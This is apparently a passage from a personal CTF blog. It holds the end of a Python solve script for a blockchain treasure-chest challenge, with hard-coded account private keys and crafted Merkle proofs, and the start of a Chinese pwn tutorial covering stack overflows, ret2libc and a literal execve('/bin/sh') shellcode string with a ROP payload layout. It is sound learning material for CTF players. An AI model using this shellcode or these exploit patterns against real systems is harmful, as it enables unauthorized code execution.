acc.address, acc.key</span><br><span class="line">    <span class="comment">#print(&#x27;[+] hacker:&#x27;, hacker)</span></span><br><span class="line">    <span class="comment">#print(bin(int(hacker,base=16)))</span></span><br><span class="line">    <span class="comment">#print(&#x27;[+] key:&#x27;,sk_hacker)</span></span><br><span class="line">    <span class="keyword">return</span> hacker,sk_hacker</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findHacker</span>():</span><br><span class="line">    find = []</span><br><span class="line">    hackers = []</span><br><span class="line">    sk_hackers = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        h,s = getAccount()</span><br><span class="line">        hackers.append(h)</span><br><span class="line">        sk_hackers.append(s)</span><br><span class="line">        binary = <span class="built_in">bin</span>(<span class="built_in">int</span>(h,base=<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">        binary = (<span class="number">160</span> - <span class="built_in">len</span>(binary)) * <span class="string">&#x27;0&#x27;</span> + binary</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> k <span class="keyword">in</span> find:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> binary[:k+<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>*k+<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(k,binary[:<span class="number">5</span>],hackers[i],sk_hackers[i])</span><br><span class="line">                find.append(k)</span><br><span class="line"><span class="comment">#findHacker()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hackers = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">hackers[<span class="number">0</span>] = <span class="string">&#x27;0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38&#x27;</span></span><br><span class="line">hackers[<span class="number">1</span>] = <span class="string">&#x27;0x1424021b77400221b9E86422571F76bF50acd44c&#x27;</span></span><br><span class="line">hackers[<span class="number">2</span>] = <span class="string">&#x27;0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB&#x27;</span></span><br><span class="line">hackers[<span class="number">3</span>] = <span class="string">&#x27;0x45AD33c37e5029804794f390cB2474349F2aDf12&#x27;</span></span><br><span class="line">hackers[<span class="number">4</span>] = <span class="string">&#x27;0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd&#x27;</span></span><br><span class="line"></span><br><span class="line">sk_hackers = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">sk_hackers[<span class="number">0</span>] = <span class="string">b&quot;\xef\x1a\xfa\x87\xde\xb0\x82\xd4e\x83\x8c\x1dR\x8d.\xfdyq\xcaX\x16\x9f\x1bZ\xfe\xbe:\x8c\xcf&#x27;Y\xbc&quot;</span></span><br><span class="line">sk_hackers[<span class="number">1</span>] = <span class="string">b&#x27;2\xc3\x99\x97\xc5\\\xe6^\xc8\x8eKQ\xb3\x93\xba(\x06\x9e%Npd\x8b\xdf\x88\x82\xdc\x9c\xe8\x99P\xf1&#x27;</span></span><br><span class="line">sk_hackers[<span class="number">2</span>] = <span class="string">b&#x27;.\x8d-\x17W\xe27\xc1\xb9 \x9ax\xb3A\x0eC\xfe\x00\x87\xc4&#125;v.9\xa6g\x96d\xd7c,\xcf&#x27;</span></span><br><span class="line">sk_hackers[<span class="number">3</span>] = <span class="string">b&#x27;^Y$eKx\x1f72\x07\xd9\x98F\x0c3\x92N\x01+\xc0J\xc7\x1c\xa5Bq\x8bhC\xef)T&#x27;</span></span><br><span class="line">sk_hackers[<span class="number">4</span>] = <span class="string">b&quot;\xa5\x13&#x27;\xfc\xa8\xbe\xd2\x94J\xb7\xc6wH:\xbb\xc5\x8c\x8d\xbf\xba\xbdG.\xa9=\x89)\x8e\xe5\xea\x12\xcb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getMoney(hackers[4])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getAccount()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_sig</span>(<span class="params">func: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(func, <span class="built_in">str</span>):</span><br><span class="line">        func = func.encode()</span><br><span class="line">    <span class="keyword">return</span> keccak(func)[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_txn</span>(<span class="params">src, dst, data, value=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;chainId&quot;</span>: w3.eth.chain_id,</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: src,</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: dst,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.toWei(<span class="number">1</span>,<span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;gas&quot;</span>: <span class="number">0x321850</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: w3.toWei(value,<span class="string">&#x27;wei&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(src),</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_tx</span>(<span class="params">signed_txn, send: <span class="built_in">bool</span> = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> send <span class="keyword">or</span> ONE_SHOT_MODE:</span><br><span class="line">        txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).<span class="built_in">hex</span>()</span><br><span class="line">        txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class="line">        <span class="keyword">assert</span> txn_receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_hacker_tx</span>(<span class="params">hacker,target,data,sk_hacker</span>):</span><br><span class="line">    <span class="comment">#通过hacker调用target的data函数</span></span><br><span class="line">    signed_txn = w3.eth.account.signTransaction(get_txn(hacker, target, data), sk_hacker)</span><br><span class="line">    send_tx(signed_txn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter</span>(<span class="params">proof</span>):</span><br><span class="line">    <span class="keyword">return</span> func_sig(<span class="string">&#x27;enter(bytes32[])&#x27;</span>) + encode_abi([<span class="string">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pickupTreasureChest_sig</span>(<span class="params">proof</span>):</span><br><span class="line">    <span class="keyword">return</span> func_sig(<span class="string">&#x27;pickupTreasureChest(bytes32[])&#x27;</span>) + encode_abi([<span class="string">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findKey_sig</span>(<span class="params">proof</span>):</span><br><span class="line">    <span class="keyword">return</span> func_sig(<span class="string">&#x27;findKey(bytes32[])&#x27;</span>) + encode_abi([<span class="string">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openTreasureChest_sig</span>():</span><br><span class="line">    <span class="keyword">return</span> func_sig(<span class="string">&#x27;openTreasureChest()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getProof</span>(<span class="params">b1,b2,h</span>):</span><br><span class="line">    proof = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = h</span><br><span class="line">    proof[<span class="number">3</span>] = b1</span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = b2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> proof</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter1</span>():</span><br><span class="line">    hacker = hackers[<span class="number">0</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">0</span>]</span><br><span class="line">    b1 = <span class="string">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class="line">    check(final_target)    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter2</span>():</span><br><span class="line">    hacker = hackers[<span class="number">1</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">1</span>]</span><br><span class="line">    b1 = <span class="string">&#x27;0x799d6ded98975eb22e289ea90ff6f3f327537299ab8325e695c61d31ee711c56&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    <span class="comment"># 根据顺序调整height </span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter3</span>():</span><br><span class="line">    hacker = hackers[<span class="number">2</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">2</span>]</span><br><span class="line">    b1 = <span class="string">&#x27;0xcc2f18436e39156aa78964ff9e33acb4778bfd7a3182a20a5e86e2578a2dd334&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter4</span>():</span><br><span class="line">    hacker = hackers[<span class="number">3</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">3</span>]</span><br><span class="line">    b1 = <span class="string">&#x27;0x68ee889a32ce609fc0acbf31dd1cc40b522d2c1fcabc0b0d5d2cd66cde478338&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter5</span>():</span><br><span class="line">    hacker = hackers[<span class="number">4</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">4</span>]</span><br><span class="line">    b1 = <span class="string">&#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class="line">    b2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    h = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof = getProof(b1,b2,h)</span><br><span class="line">    send_hacker_tx(hacker,final_target,enter(proof),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pickupTreasureChest</span>():</span><br><span class="line">    </span><br><span class="line">    hacker = hackers[<span class="number">0</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先做这个 根据递增的要求构造出5个地址 记录merge的顺序</span></span><br><span class="line">    c1 = <span class="string">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class="line">    c2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line">    n = <span class="number">19</span></span><br><span class="line">    proof = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">3</span>] = c1</span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">7</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">8</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">9</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">10</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">11</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">12</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">13</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">14</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">15</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">16</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">17</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">18</span>] = c2</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">        </span><br><span class="line">    send_hacker_tx(hacker,final_target,pickupTreasureChest_sig(proof),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findKey</span>():</span><br><span class="line">    </span><br><span class="line">    hacker = hackers[<span class="number">0</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    c1 = <span class="string">&#x27;0xbccd02410d2e51fe9783b9597d341834148ebbfd545ad02023fcf29e54ffc35e&#x27;</span></span><br><span class="line">    c2 = <span class="string">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class="line"></span><br><span class="line">    n = <span class="number">19</span></span><br><span class="line">    proof = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    proof[<span class="number">0</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">1</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">2</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">3</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">4</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">5</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">6</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">7</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">8</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">9</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class="line">    </span><br><span class="line">    proof[<span class="number">10</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class="line">    proof[<span class="number">11</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class="line">    proof[<span class="number">12</span>] = <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class="line"></span><br><span class="line">    proof[<span class="number">13</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">14</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">15</span>] = c1</span><br><span class="line"></span><br><span class="line">    proof[<span class="number">16</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class="line">    proof[<span class="number">17</span>] = <span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    proof[<span class="number">18</span>] = c2</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        proof[i] = <span class="built_in">bytes</span>.fromhex(proof[i][<span class="number">2</span>:])</span><br><span class="line">        </span><br><span class="line">    send_hacker_tx(hacker,final_target,findKey_sig(proof),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openTreasureChest</span>():</span><br><span class="line">    hacker = hackers[<span class="number">0</span>]</span><br><span class="line">    sk_hacker = sk_hackers[<span class="number">0</span>]</span><br><span class="line">    send_hacker_tx(hacker,final_target,openTreasureChest_sig(),sk_hacker)</span><br><span class="line">    check(final_target)</span><br><span class="line">openTreasureChest()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/ctf/pwn/" class="post-title-link" itemprop="url">pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-22 20:29:20 / Modified: 20:29:21" itemprop="dateCreated datePublished" datetime="2024-01-22T20:29:20+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>7.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>29 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>对方给你远程执行一个程序 你需要控制对方计算机</p>
<ol>
<li>发现漏洞 更改控制流</li>
<li>找执行system(“&#x2F;bin&#x2F;sh”)的方式</li>
</ol>
<ul>
<li>file 看文件类型 32还是64</li>
<li>用ida看反编译</li>
<li>checksec 看保护</li>
<li>objdump -d file &gt; asm.txt 看汇编</li>
</ul>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a target="_blank" rel="noopener" href="https://github.com/skysider/pwndocker">skysider&#x2F;pwndocker: A docker environment for pwn in ctf (github.com)</a></p>
<p>gdb pwntools</p>
<p>如果运行二进制报libc版本的错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<ul>
<li>添加高版本的源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://th.archive.ubuntu.com/ubuntu jammy main    #添加该行到文件</span><br></pre></td></tr></table></figure>

<ul>
<li>运行升级</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install libc6</span><br></pre></td></tr></table></figure>



<h2 id="栈溢出-stackoverflow"><a href="#栈溢出-stackoverflow" class="headerlink" title="栈溢出(stackoverflow)"></a>栈溢出(stackoverflow)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[size];</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure>

<p>gets不限制长度 read长度不匹配</p>
<p>汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov esp,ebp</span><br><span class="line">sub esp,size</span><br><span class="line">...</span><br><span class="line">call gets</span><br><span class="line">add esp,size</span><br><span class="line">...</span><br><span class="line">leave  (mov ebp,esp  /  pop ebp)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>32位：覆盖size+4</p>
<ul>
<li><p>system(‘bin&#x2F;sh’) 或 execve(‘bin&#x2F;sh’,0,0) 都可以  </p>
</li>
<li><p>system有时候要求栈16地址对齐  但有时候满足了还是会出错</p>
</li>
<li><p>execve二 三个参数不设置可能也可以 （看运气）</p>
</li>
<li><p>本地调试的环境和libc会和远程有差异</p>
</li>
</ul>
<h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>程序中存在system(“&#x2F;bin&#x2F;sh”)函数 直接把这个函数的地址覆盖至栈上的retaddr</p>
<h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><p>程序中不存在system函数 在栈上写shellcode  把栈的起始地址覆盖至栈上的retaddr 执行shellcode</p>
<p><code>b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</code></p>
<h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>栈地址随机化 只能把shellcode写到另一块地方(确定的地址) 然后更改执行流至这个确定的地址</p>
<p>这个地址必须是可以写入数据的  text段不允许写入数据  data段可以</p>
<p><code>readelf -S findshellcode</code>可以查看 (栈地址随机化 text段和data段地址确定)</p>
<p>利用两次read</p>
<ul>
<li><p>第一次 ：栈溢出 布置栈</p>
<p><code>pad + p32(read_addr) + p32(shellcode_addr)+p32(0)+p32(shellcode_addr)+p32(0x80)</code></p>
<p>最后三个是read的参数 分别是stdin 写入地址 写入字节数</p>
</li>
<li><p>第二次：发送shellcode（加\x00中止）</p>
</li>
</ul>
<p>int 80 软中断原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965">Linux系统调用 int 80h int 0x80_xiaominthere的专栏-CSDN博客</a></p>
<h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h3><p>程序中不存在system函数 栈不可执行 利用libc里的system函数和&#x2F;bin&#x2F;sh字符串</p>
<p>plt 局部 别人写的库 你程序里用到了  你程序里会有一个这个函数的地址 不是真实的 会直接跳到got中</p>
<p>got 全局 但是记录的是偏移</p>
<p>真实地址 &#x3D; 基地址 + 偏移地址  </p>
<p>目标：拿到基地址与偏移地址 计算system与”&#x2F;bin&#x2F;sh”的真实地址</p>
<ul>
<li><p>偏移地址：可由一个确定版本的libc库决定 （本地调试的时候会使用本地环境的libc导致问题）</p>
<ul>
<li><p>题目给了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    func_offset = libc.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">    str_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">  - 题目没给</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    ```python</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;func&#x27;</span>,func_addr)<span class="comment">#泄露的真实地址</span></span><br><span class="line">    func_offset = libc.dump(<span class="string">&#x27;func&#x27;</span>)</span><br><span class="line">    str_offset = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">- 基地址 = 真实地址 - 偏移地址  </span><br><span class="line"></span><br><span class="line">  `elf = ELF(<span class="string">&#x27;./elf&#x27;</span>)`</span><br><span class="line"></span><br><span class="line">  - 需要一个在漏洞前已经执行过的函数(__libc_start_main  puts) 